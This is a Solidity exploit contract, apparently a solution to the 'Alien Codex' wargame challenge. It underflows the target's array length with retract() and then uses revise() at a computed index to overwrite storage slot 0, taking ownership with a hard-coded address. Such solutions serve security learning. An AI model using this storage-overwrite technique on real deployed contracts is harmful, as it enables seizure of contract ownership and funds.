// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;
import "./AlienCodex.sol";

contract AlienCodexHelper {
    function resolve(address alienCodexAddr) public {
        uint slotIndex = 1;
        uint i = 2**256 - 1 - uint(keccak256(abi.encodePacked(slotIndex))) + 1;
        AlienCodex(alienCodexAddr).make_contact();
        AlienCodex(alienCodexAddr).retract();
        AlienCodex(alienCodexAddr).revise(i, 0x0000000000000000000000006343a423ab47cf92f89e2451171d38ac1d0606e9);
    }
}